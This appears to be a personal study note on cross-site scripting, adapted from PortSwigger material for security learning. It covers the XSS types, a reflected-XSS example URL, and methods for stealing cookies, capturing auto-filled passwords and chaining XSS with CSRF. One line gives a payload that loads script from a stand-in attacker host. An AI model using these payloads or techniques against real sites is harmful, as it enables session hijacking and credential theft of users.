Cross-site scripting

----

![](/static/img/Pasted_image_20230614133428.png)


### What is cross-site scripting (XSS)?

- Cross-site scripting (also known as XSS) is a web security vulnerability that **allows an attacker to compromise the interactions that users have with a vulnerable application**. It **allows an attacker to circumvent the same origin policy**, **which is designed to segregate different websites from each other**. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data

- ### How does XSS work?
	- Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users.
	- When the malicious code executes **inside a victim's browser**, the attacker can fully compromise their interaction with the application.

- ### XSS Prof of concept
	- `alert()` is not good enough to trigger the payload! because of chrome update at chrome 92 - https://chromestatus.com/feature/5148698084376576
	- Use `print()` or OOB payload like `<script src=http://attacker.com/1.js></script>`
- ### What are the types of XSS attacks?
	-  [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting), where the malicious script comes from the current HTTP request.
	-  [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting), where the malicious script comes from the website's database.
	-  [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting), where the vulnerability exists in client-side code rather than server-side code.

----
### [Reflected cross-site scripting]

- [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.
- Here is a simple example of a reflected XSS vulnerability:

	`https://insecure-website.com/status?message=All+is+well. <p>Status: All is well.</p>`

- The application doesn't perform any other processing of the data, so an attacker can easily construct an attack like this:

	`https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script> <p>Status: <script>/* Bad stuff here... */</script></p>`

- If the user visits the URL constructed by the attacker, then the attacker's script executes in the user's browser, in the context of that user's session with the application. At that point, the script can carry out any action, and retrieve any data, to which the user has access.

#### Impact of reflected XSS attacks

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:

- Perform any action within the application that the user can perform.
- View any information that the user is able to view.
- Modify any information that the user is able to modify.
- Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

> There are various means by which an attacker **might induce a victim user to make a request that they control**, to deliver a reflected XSS attack. These include placing links on a website controlled by the attacker, or on another website that allows content to be generated, or by sending a link in an email, tweet or other message. The attack could be targeted directly against a known user, or could be an indiscriminate attack against any users of the application.

The need for an external delivery mechanism for the attack means that the impact of reflected XSS is generally less severe than [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored), where a self-contained attack can be delivered within the vulnerable application itself.

#### Exploiting cross-site scripting vulnerabilities

- The traditional way to prove that you've found a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) vulnerability is to create a popup using the `alert()` function. This isn't because [XSS](https://portswigger.net/web-security/cross-site-scripting) has anything to do with popups; it's simply a way to prove that you can execute arbitrary JavaScript on a given domain. You might notice some people using `alert(document.domain)`. This is a way of making it explicit which domain the JavaScript is executing on.

#### Exploiting cross-site scripting to steal cookies

Stealing cookies is a traditional way to exploit XSS. Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.

In practice, **this approach has some significant limitations**:

- The victim might not be logged in.
- Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
- Sessions might be locked to additional factors like the user's IP address.
- The session might time out before you're able to hijack it.

### Exploiting cross-site scripting to capture passwords

These days, many users have password managers that auto-fill their passwords. You can take advantage of this by **creating a password input**, **reading out the auto-filled password**, and sending it to your own domain. This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password. The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill. (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same.)

### Exploiting cross-site scripting to perform [CSRF](https://portswigger.net/web-security/csrf)

**Anything a legitimate user can do on a web site, you can probably do too with XSS**. Depending on the site you're targeting, you might be able to make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin.

**Some websites allow logged-in users to change their email address without re-entering their password**. If you've found an XSS vulnerability, you can make it trigger this functionality to change the victim's email address to one that you control, and then trigger a password reset to gain access to the account.

This type of exploit is typically referred to as [cross-site request forgery](https://portswigger.net/web-security/csrf) (CSRF), which is slightly confusing because CSRF can also occur as a standalone vulnerability. When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.

#### Reflected XSS in different contexts

There are many different varieties of reflected cross-site scripting. The location of the reflected data within the application's response determines what type of payload is required to exploit it and might also affect the impact of the vulnerability.

In addition, if the application performs any validation or other processing on the submitted data before it is reflected, this will generally affect what kind of XSS payload is needed.

